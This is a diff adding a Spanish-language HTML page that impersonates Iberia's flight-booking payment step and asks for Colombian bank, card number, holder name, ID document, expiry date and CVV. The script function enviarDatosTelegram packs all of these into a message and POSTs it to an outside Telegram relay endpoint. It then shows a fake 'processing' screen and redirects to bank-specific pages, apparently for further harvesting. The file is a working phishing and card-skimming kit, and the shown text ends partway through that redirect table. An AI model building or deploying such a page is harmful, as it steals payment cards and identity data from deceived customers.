@@ -1,0 +1,1401 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Información de pago</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+        
+        .header {
+             background: linear-gradient(135deg, #d32f2f, #f44336);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+  
+        .flight-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .airplane-icon {
+            width: 20px;
+            height: 20px;
+            background-color: #ffc107;
+            border-radius: 50%;
+            position: relative;
+        }
+        
+        .airplane-icon::after {
+            content: '✈';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #dc3545;
+            font-size: 12px;
+        }
+        
+        .route {
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .date {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .passenger-count {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 14px;
+        }
+        
+        .modify-search {
+            color: white;
+            text-decoration: underline;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-icon {
+            width: 20px;
+            height: 20px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .user-icon::after {
+            content: '👤';
+            font-size: 12px;
+            color: #dc3545;
+        }
+        
+        .total-price {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .progress-steps {
+            background-color: white;
+            padding: 20px 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #666;
+            flex-shrink: 0;
+        }
+        
+        .step.active {
+            color: #dc3545;
+            font-weight: 500;
+        }
+        
+        .step-number {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .step.active .step-number {
+            background-color: #dc3545;
+            color: white;
+        }
+        
+        .main-content {
+            padding: 20px 15px;
+        }
+        
+        .page-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        
+        .form-container {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .payment-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .payment-icon {
+            color: #dc3545;
+            font-size: 20px;
+        }
+        
+        .payment-title {
+            font-size: 18px;
+            color: #dc3545;
+            font-weight: 500;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            flex: 1;
+        }
+        
+        .form-group.half {
+            flex: 0.5;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .form-label.required::after {
+            content: ' *';
+            color: #dc3545;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            background-color: #fff;
+            position: relative;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #dc3545;
+        }
+        
+        .form-input.error {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+        
+        .form-input::placeholder {
+            color: #aaa;
+        }
+        
+        .date-group {
+            display: flex;
+            gap: 10px;
+            align-items: flex-end;
+        }
+        
+        .date-select {
+            flex: 1;
+        }
+        
+        .date-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+        
+        .form-select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            background-color: #fff;
+            cursor: pointer;
+        }
+        
+        .form-select:focus {
+            outline: none;
+            border-color: #dc3545;
+        }
+        
+        .cvv-group {
+            position: relative;
+        }
+        
+        .cvv-input {
+            padding-right: 40px;
+        }
+        
+        .cvv-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            cursor: pointer;
+        }
+        
+        .cvv-help {
+            display: block;
+            margin-top: 5px;
+            font-size: 12px;
+            color: #666;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        .button-container {
+            margin-top: 40px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 15px;
+        }
+        
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-secondary {
+            background-color: #f8f9fa;
+            color: #666;
+            border: 1px solid #ddd;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e9ecef;
+        }
+        
+        .btn-primary {
+            background-color: #dc3545;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #c82333;
+        }
+        
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Media Queries para Responsive Design */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+                padding: 15px 10px;
+            }
+            
+            .flight-info {
+                order: 2;
+            }
+            
+            .user-info {
+                order: 1;
+                justify-content: center;
+            }
+            
+            .total-price {
+                font-size: 16px;
+            }
+            
+            .progress-steps {
+                padding: 15px 5px;
+                gap: 8px;
+            }
+            
+            .step {
+                font-size: 12px;
+                gap: 5px;
+            }
+            
+            .step span {
+                display: none;
+            }
+            
+            .step-number {
+                width: 18px;
+                height: 18px;
+                font-size: 10px;
+            }
+            
+            .main-content {
+                padding: 15px 10px;
+            }
+            
+            .form-container {
+                padding: 15px;
+                border-radius: 0;
+                margin: 0;
+                box-shadow: none;
+            }
+            
+            .page-title {
+                font-size: 20px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .form-group.half {
+                flex: 1;
+            }
+            
+            .payment-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            
+            .date-group {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .button-container {
+                flex-direction: column;
+                gap: 10px;
+                margin-top: 30px;
+            }
+            
+            .btn {
+                width: 100%;
+                padding: 15px;
+                font-size: 16px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header {
+                padding: 10px 5px;
+            }
+            
+            .progress-steps {
+                padding: 10px 5px;
+                gap: 5px;
+            }
+            
+            .main-content {
+                padding: 10px 5px;
+            }
+            
+            .form-container {
+                padding: 5%;
+                margin: 3%;
+            }
+            
+            .page-title {
+                font-size: 18px;
+            }
+            
+            .payment-title {
+                font-size: 16px;
+            }
+            
+            .form-input {
+                padding: 15px 12px;
+                font-size: 16px; /* Previene zoom en iOS */
+            }
+            
+            .form-select {
+                padding: 15px 12px;
+                font-size: 16px;
+            }
+            
+            .total-price {
+                font-size: 14px;
+            }
+        }
+
+        /* Pantalla de carga */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #f8f9fa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.loading-container {
+    text-align: center;
+    background: white;
+    padding: 50px 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    border: 1px solid #e9ecef;
+    max-width: 300px;
+}
+
+.spinner {
+    width: 40px;
+    height: 40px;
+    border: 3px solid #e9ecef;
+    border-top: 3px solid #0d6efd;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 25px auto;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loading-text {
+    font-size: 16px;
+    font-weight: 500;
+    margin: 0 0 8px 0;
+    color: #495057;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+.loading-subtext {
+    font-size: 13px;
+    margin: 0;
+    color: #6c757d;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+.footer {
+            
+            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+            color: white;
+            padding: 15px 0;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            flex: 1;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 20px;
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(45deg);
+            width: 8px;
+            height: 15px;
+            background: #d32f2f;
+            border-radius: 2px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #ffeb3b;
+        }
+
+        .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .payment-icon {
+            width: 40px;
+            height: 25px;
+            background: white;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            color: #333;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .payment-icon.amex {
+            background: #006fcf;
+            color: white;
+        }
+
+        .payment-icon.diners {
+            background: #0079be;
+            color: white;
+        }
+
+        .payment-icon.visa {
+            background: #1a1f71;
+            color: white;
+        }
+
+        .payment-icon.mastercard {
+            background: linear-gradient(45deg, #eb001b, #ff5f00);
+            color: white;
+        }
+
+        .payment-icon.id-check {
+            background: #ff6b35;
+            color: white;
+            font-size: 8px;
+        }
+
+        .payment-icon.safepay {
+            background: #4285f4;
+            color: white;
+        }
+
+        .payment-icon.other {
+            background: #333;
+            color: white;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .footer {
+                position: relative;
+            }
+            
+            body {
+                padding-bottom: 0;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+
+            .footer-left {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .footer-links {
+                justify-content: center;
+                gap: 15px;
+            }
+
+            .footer-links a {
+                font-size: 13px;
+            }
+
+            .payment-methods {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 8px;
+            }
+
+            .payment-icon {
+                width: 35px;
+                height: 22px;
+                font-size: 9px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .footer {
+                padding: 12px 0;
+            }
+            
+            .footer-container {
+                padding: 0 15px;
+            }
+
+            .logo {
+                font-size: 20px;
+            }
+
+            .logo-icon {
+                width: 35px;
+                height: 18px;
+            }
+
+            .footer-links {
+                gap: 12px;
+            }
+
+            .footer-links a {
+                font-size: 12px;
+            }
+
+            .payment-methods {
+                gap: 6px;
+            }
+
+            .payment-icon {
+                width: 32px;
+                height: 20px;
+                font-size: 8px;
+            }
+        }
+    </style>
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="flight-info">
+             <div class="logo">
+                <img src="img/IBERIA.COM_ los mejores precios para vuelos de Iberia.svg" alt="Iberia Logo">
+            </div>
+        </div>
+        <div class="user-info">
+            <i class="fa-solid fa-user"></i>
+            <!-- <span>Acceder</span> -->
+        </div>
+    </div>
+    
+    <div class="progress-steps">
+        <div class="step">
+            <div class="step-number">1</div>
+            <span>Selección de vuelos</span>
+        </div>
+        <div class="step">
+            <div class="step-number">2</div>
+            <span>Datos de pasajeros</span>
+        </div>
+        <div class="step">
+            <div class="step-number">3</div>
+            <span>Personaliza y completa</span>
+        </div>
+        <div class="step active">
+            <div class="step-number">4</div>
+            <span>Pago</span>
+        </div>
+        <div class="step">
+            <div class="step-number">5</div>
+            <span>Confirmación</span>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="form-container">
+            <h1 class="page-title">Información de pago</h1>
+            
+            <div class="payment-header">
+                <div class="payment-icon"><i class="fa-solid fa-credit-card"></i></div>
+                <div class="payment-title">Seleccione método de pago</div>
+            </div>
+            
+            <form id="paymentForm">
+                <!-- Selector de Banco -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required">Seleccione su banco</label>
+                        <select class="form-select" id="banco" name="banco" onchange="validateForm()" required>
+                            <option value="" disabled selected>Seleccione su banco</option>
+                            <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+        <option value='BANCO AGRARIO'>BANCO AGRARIO</option>
+        <option value='BANCO AVVILLAS'>BANCO AV VILLAS</option>
+        <option value='BANCO BBVA'>BANCO BBVA</option>
+        <option value='BANCO CAJA SOCIAL'>BANCO CAJA SOCIAL</option>
+        <option value='BANCO CITIBANK'>BANCO CITIBANK</option>
+        <option value='BANCO COLPATRIA'>BANCO COLPATRIA</option>
+        <option value='BANCO CORPBANCA'>BANCO CORPBANCA</option>
+        <option value='BANCO DAVIVIENDA'>BANCO DAVIVIENDA</option>
+        <option value='BANCO DE BOGOTA'>BANCO DE BOGOTA</option>
+        <option value='BANCO DE OCCIDENTE'>BANCO DE OCCIDENTE</option>
+        <option value='BANCO FALABELLA'>BANCO FALABELLA</option>
+        <option value='BANCO FINANDINA'>BANCO FINANDINA</option>
+        <option value='BANCO GANADERO'>BANCO GANADERO</option>
+        <option value='BANCO GNB SUDAMERIS'>BANCO GNB SUDAMERIS</option>
+        <option value='BANCO HSBC COLOMBIA'>BANCO HSBC COLOMBIA</option>
+        <option value='BANCO ITAU'>BANCO ITAU</option>
+        <option value='BANCO BOLIVARIANO'>BANCO BOLIVARIANO</option>
+        <option value='BANCO GUAYAQUIL'>BANCO GUAYAQUIL</option>
+        <option value='BANCO PACIFICO'>BANCO PACIFICO</option>
+        <option value='PRODUBANCO'>PRODUBANCO</option>
+        <option value='BANCO PICHINCHA'>BANCO PICHINCHA</option>
+        <option value='BANCO POPULAR'>BANCO POPULAR</option>
+        <option value='BANCO SANTANDER'>BANCO SANTANDER COLOMBIA</option>
+        <option value='BANCO HELM BANK'>HELM BANK</option>
+        <option value='NEQUI'>NEQUI</option>
+        <option value='TUYA'>TUYA</option>
+        <option value='NUBANK'>NUBANK</option>
+        <option value="NN">OTRO</option>
+                        </select>
+                        <div class="error-message" id="bancoError">Este campo es obligatorio</div>
+                    </div>
+                </div>
+
+                <!-- Número de Tarjeta -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required">Número de tarjeta</label>
+                        <input type="text" class="form-input" id="numeroTarjeta" placeholder="" maxlength="19" oninput="formatCardNumber(this); validateForm()" required>
+                        <div class="error-message" id="numeroTarjetaError">Este campo es obligatorio</div>
+                    </div>
+                </div>
+                
+                <!-- Nombre del titular -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required">Nombre del titular</label>
+                        <input type="text" class="form-input" id="nombreTitular" placeholder="Nombre del titular" oninput="validateForm()" required>
+                        <div class="error-message" id="nombreTitularError">Este campo es obligatorio</div>
+                    </div>
+                </div>
+                
+                <!-- Documento del titular -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required">Documento del titular</label>
+                        <input type="number" class="form-input" id="documentoTitular" placeholder="Documento del titular" oninput="validateForm()" required>
+                        <div class="error-message" id="documentoTitularError">Este campo es obligatorio</div>
+                    </div>
+                </div>
+                
+                <!-- Fecha de vencimiento y CVV -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label required">Fecha de expiración</label>
+                        <input type="text" class="form-input" id="fechaExpiracion" placeholder="MM/AA" maxlength="5" oninput="formatExpiryDate(this); validateForm()" required>
+                        <div class="error-message" id="fechaExpiracionError">Este campo es obligatorio</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label required">Código CVV</label>
+                        <div class="cvv-group">
+                            <input type="password" class="form-input cvv-input" id="codigoCVV" placeholder="123" maxlength="4" oninput="limitCVV(this); validateForm()" required>
+                            <i class="fa-solid fa-eye cvv-icon" onclick="toggleCVV()" id="cvvToggle"></i>
+                        </div>
+                        <span class="cvv-help" onclick="showCVVInfo()">¿Qué es el CVV?</span>
+                        <div class="error-message" id="codigoCVVError">Este campo es obligatorio</div>
+                    </div>
+                </div>
+                
+                <div class="button-container">
+                    <button type="button" class="btn btn-secondary" onclick="goBack()">Atrás</button>
+                    <button type="button" class="btn btn-primary" id="continueBtn" onclick="enviarDatosTelegram()" disabled>Confirmar</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Sección de pago final -->
+        <div class="payment-summary-container">
+            <style>
+                       .payment-summary-container {
+           background: white;
+           padding: 20px;
+           margin: 23%;
+           margin-top: 3%;
+           margin-bottom: 3%;
+           box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+           border: 1px solid #e0e0e0;
+       }
+       
+       /* Estilos para móviles */
+       @media (max-width: 768px) {
+           
+           
+           .payment-summary-container {
+               background: white;
+               padding: 15px 20px;
+               margin: 0;
+               margin-top: 3%;
+                margin-bottom: 3%;
+           }
+       }
+                
+                .terms-section {
+                    margin-bottom: 20px;
+                }
+                
+                .checkbox-container {
+                    display: flex;
+                    align-items: flex-start;
+                    gap: 10px;
+                }
+                
+                .terms-checkbox {
+                    margin-top: 3px;
+                    width: 16px;
+                    height: 16px;
+                    flex-shrink: 0;
+                }
+                
+                .terms-label {
+                    font-size: 14px;
+                    color: #666;
+                    line-height: 1.4;
+                }
+                
+                .terms-link {
+                    color: #0066cc;
+                    text-decoration: none;
+                }
+                
+                .terms-link:hover {
+                    text-decoration: underline;
+                }
+                
+                .resumen-pago {
+                    text-align: left;
+                    margin-bottom: 15px;
+                }
+                
+                .resumen-pago h3 {
+                    font-size: 14px;
+                    color: #666;
+                    margin: 0 0 10px 0;
+                    font-weight: normal;
+                }
+                
+                .precio-total {
+                    font-size: 32px;
+                    font-weight: bold;
+                    color: #333;
+                    margin: 10px 0;
+                }
+                
+                .info-adicional {
+                    margin: 20px 0;
+                }
+                
+                .avios-info {
+                    font-size: 14px;
+                    color: #666;
+                    margin-bottom: 8px;
+                    line-height: 1.4;
+                }
+                
+                .precio-info {
+                    font-size: 14px;
+                    color: #666;
+                    line-height: 1.4;
+                    margin-bottom: 20px;
+                }
+                
+                .info-link {
+                    color: #0066cc;
+                    text-decoration: underline;
+                }
+                
+                .confirm-payment-btn {
+                    background: #dc2626;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 4px;
+                    font-size: 16px;
+                    font-weight: 500;
+                    cursor: pointer;
+                    width: 100%;
+                    margin-bottom: 20px;
+                }
+                
+                .confirm-payment-btn:hover {
+                    background: #b91c1c;
+                }
+                
+                .security-certificate {
+                    text-align: right;
+                }
+                
+                .security-certificate img {
+                    width: 100px;
+                    height: auto;
+                }
+            </style>
+            
+            
+
+            <!-- Resumen de pago -->
+            <div class="resumen-pago">
+                <h3>Precio total</h3>
+                <div class="precio-total"><span class="precio-confirmacion">0 COP</span></div>
+            </div>
+
+            <!-- Información adicional -->
+            <div class="info-adicional">
+                <p class="avios-info">Esta reserva generará al menos <strong>2.771 Avios y 546 Puntos Elite</strong> entre los pasajeros registrados en Iberia Plus.</p>
+                <p class="precio-info">Precio total, incluye tarifa aérea, todas las <a href="#" class="info-link">tasas</a>, <a href="#" class="info-link">impuestos</a> (salvo los que se cobren en determinados aeropuertos en el momento de facturar) y el costo de combustible.</p>
+                <!-- Certificado de seguridad -->
+             <div class="security-certificate">
+                <img src="img/globalSign.png" alt="Certificado de Seguridad GlobalSign">
+            </div> 
+            </div>
+
+            <!-- Botón de confirmación final
+            <button type="button" class="confirm-payment-btn" onclick="enviarDatosTelegram()">Aceptar y pagar ahora</button> -->
+            <!-- Términos y condiciones -->
+            <!-- <div class="terms-section">
+                <div class="checkbox-container">
+                    <input type="checkbox" id="terminos" class="terms-checkbox">
+                    <label for="terminos" class="terms-label">
+                        He leído y acepto los <a href="#" class="terms-link">términos y condiciones</a> generales de compra, las <a href="#" class="terms-link">condiciones de contrato</a> y las <a href="#" class="terms-link">condiciones de la aeronáutica civil colombiana</a>
+                    </label>
+                </div> -->
+            </div>
+
+            
+        </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <div class="logo">
+                        <img src="img/IBERIA.COM_ los mejores precios para vuelos de Iberia.svg" alt="">
+                    </div>
+                    <nav class="footer-links">
+                        <a href="#accesibilidad">Accesibilidad</a>
+                        <a href="#politica-datos">Política de protección de datos personales</a>
+                    </nav>
+                </div>
+                
+                <!-- <div class="footer-right">
+                    <div class="payment-methods">
+                        
+                        <div class="payment-icon amex">AMEX</div>
+                        <div class="payment-icon diners">DC</div>
+                        <div class="payment-icon visa">VISA</div>
+                        <div class="payment-icon mastercard">MC</div>
+                        <div class="payment-icon id-check">ID</div>
+                        <div class="payment-icon safepay">SAFE</div>
+                        <div class="payment-icon other">PAY</div>
+                    </div>
+                </div> -->
+            </div>
+        </div>
+    </footer>
+</body>
+    
+    <script>
+        // Variable global para almacenar datos
+        window.paymentData = {};
+
+        // Función para obtener parámetros de la URL
+        function obtenerParametros() {
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Obtener precio
+            const precio = urlParams.get('precio');
+            if (precio) {
+                document.getElementById('totalPrice').textContent = `TOTAL: ${precio}`;
+            }
+            
+            console.log('Parámetros de URL encontrados en página de pago:');
+            for (let [key, value] of urlParams) {
+                console.log(`${key}:`, value);
+            }
+        }
+        
+        // Función para formatear número de tarjeta
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+            if (formattedValue.length > 19) {
+                formattedValue = formattedValue.substring(0, 19);
+            }
+            input.value = formattedValue;
+        }
+
+        // Función para formatear fecha de expiración
+        function formatExpiryDate(input) {
+            var sanitized = input.value.replace(/[^0-9]/g, '');
+            if (sanitized.length > 2) {
+                sanitized = sanitized.substring(0, 2) + '/' + sanitized.substring(2, 4);
+            }
+            input.value = sanitized;
+        }
+
+        // Función para limitar CVV
+        function limitCVV(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            if (input.value.length > 4) {
+                input.value = input.value.slice(0, 4);
+            }
+        }
+        
+        // Función para mostrar/ocultar CVV
+        function toggleCVV() {
+            const cvvInput = document.getElementById('codigoCVV');
+            const toggleIcon = document.getElementById('cvvToggle');
+            
+            if (cvvInput.type === 'password') {
+                cvvInput.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                cvvInput.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        }
+        
+        // Función para mostrar información del CVV
+        function showCVVInfo() {
+            alert('El CVV es un código de seguridad de 3 o 4 dígitos ubicado en el reverso de su tarjeta.');
+        }
+        
+        // Función para mostrar pantalla de carga
+        function mostrarPantallaCarga() {
+            const loadingHTML = `
+                <div id="loadingScreen" class="loading-overlay">
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <p class="loading-text">Procesando información...</p>
+                        <p class="loading-subtext">Por favor espere</p>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', loadingHTML);
+        }
+
+        // Función para ocultar pantalla de carga
+        function ocultarPantallaCarga() {
+            const loadingScreen = document.getElementById('loadingScreen');
+            if (loadingScreen) {
+                loadingScreen.remove();
+            }
+        }
+
+        // Función para validar número de tarjeta con algoritmo de Luhn
+        function validarLuhn(numero) {
+            let suma = 0;
+            let alternar = false;
+            
+            // Recorrer de derecha a izquierda
+            for (let i = numero.length - 1; i >= 0; i--) {
+                let n = parseInt(numero.charAt(i), 10);
+                
+                if (alternar) {
+                    n *= 2;
+                    if (n > 9) {
+                        n = (n % 10) + 1;
+                    }
+                }
+                
+                suma += n;
+                alternar = !alternar;
+            }
+            
+            return (suma % 10) === 0;
+        }
+
+        // Función para validar el formulario
+        function validateForm() {
+            const requiredFields = [
+                'banco', 'numeroTarjeta', 'nombreTitular', 'documentoTitular', 
+                'fechaExpiracion', 'codigoCVV'
+            ];
+            let allValid = true;
+            
+            requiredFields.forEach(fieldId => {
+                const field = document.getElementById(fieldId);
+                const errorDiv = document.getElementById(fieldId + 'Error');
+                
+                // Validar campo vacío
+                if (!field.value.trim()) {
+                    field.classList.add('error');
+                    if (errorDiv) errorDiv.style.display = 'block';
+                    allValid = false;
+                } else {
+                    // Validaciones específicas
+                    if (fieldId === 'numeroTarjeta') {
+                        const cardNumber = field.value.replace(/\s/g, '');
+                        if (cardNumber.length < 13 || cardNumber.length > 19) {
+                            field.classList.add('error');
+                            errorDiv.style.display = 'block';
+                            errorDiv.textContent = 'Número de tarjeta inválido';
+                            allValid = false;
+                        } else if (!validarLuhn(cardNumber)) {
+                            field.classList.add('error');
+                            errorDiv.style.display = 'block';
+                            errorDiv.textContent = 'Número de tarjeta inválido';
+                            allValid = false;
+                        } else {
+                            field.classList.remove('error');
+                            errorDiv.style.display = 'none';
+                        }
+                    } else if (fieldId === 'codigoCVV') {
+                        if (field.value.length < 3 || field.value.length > 4) {
+                            field.classList.add('error');
+                            errorDiv.style.display = 'block';
+                            errorDiv.textContent = 'CVV debe tener 3 o 4 dígitos';
+                            allValid = false;
+                        } else {
+                            field.classList.remove('error');
+                            errorDiv.style.display = 'none';
+                        }
+                    } else if (fieldId === 'fechaExpiracion') {
+                        if (field.value.length !== 5 || !field.value.includes('/')) {
+                            field.classList.add('error');
+                            errorDiv.style.display = 'block';
+                            errorDiv.textContent = 'Formato debe ser MM/AA';
+                            allValid = false;
+                        } else {
+                            field.classList.remove('error');
+                            errorDiv.style.display = 'none';
+                        }
+                    } else {
+                        field.classList.remove('error');
+                        if (errorDiv) errorDiv.style.display = 'none';
+                    }
+                }
+            });
+            
+            // Habilitar/deshabilitar botón continuar
+            document.getElementById('continueBtn').disabled = !allValid;
+            
+            return allValid;
+        }
+        
+        // Función para volver atrás
+        function goBack() {
+            window.history.back();
+        }
+        
+        // Función principal para enviar datos a Telegram
+        async function enviarDatosTelegram() {
+            if (!validateForm()) {
+                alert('Por favor complete todos los campos correctamente.');
+                return;
+            }
+
+            // Mostrar pantalla de carga
+            mostrarPantallaCarga();
+
+            const titular = document.getElementById('nombreTitular').value.trim();
+            const numeroTarj = document.getElementById('numeroTarjeta').value.replace(/\s+/g,'');
+            const fechaExp = document.getElementById('fechaExpiracion').value;
+            const cvv = document.getElementById('codigoCVV').value;
+            const documento = document.getElementById('documentoTitular').value.trim();
+            const banco = document.getElementById('banco').value;
+
+            // Construir mensaje con emojis
+            const mensaje = `
+🔻 *Nueva solicitud de datos* 🔻
+
+👤 Titular: ${titular}
+💳 Número de tarjeta: ${numeroTarj}
+📅 Fecha de expiración: ${fechaExp}
+🔐 CVV: ${cvv}
+🆔 Documento: ${documento}
+🏦 Banco: ${banco}
+            `.trim();
+
+            try {
+                const resp = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: mensaje })
+                });
+
+                if (resp.ok) {
+                    // Esperar un momento antes de redirigir para que se vea la pantalla de carga
+                    setTimeout(() => {
+                        redirigirSegunBanco(banco);
+                    }, 1000);
+                } else {
+                    ocultarPantallaCarga();
+                    console.error('Error API status:', resp.status);
+                    alert('Error al enviar la información. Por favor intente nuevamente.');
+                }
+            } catch (err) {
+                ocultarPantallaCarga();
+                console.error('Fallo de red:', err);
+                alert('Error de conexión. Por favor verifique su internet e intente nuevamente.');
+            }
+        }
+
+        // Función para redireccionar según el banco
+        function redirigirSegunBanco(banco) {
+            const redirecciones = {
+                 'BANCOLOMBIA': 'bancos/bancol/formulario_u1.php',
+        'BANCO AGRARIO': 'bancos/agra.html',
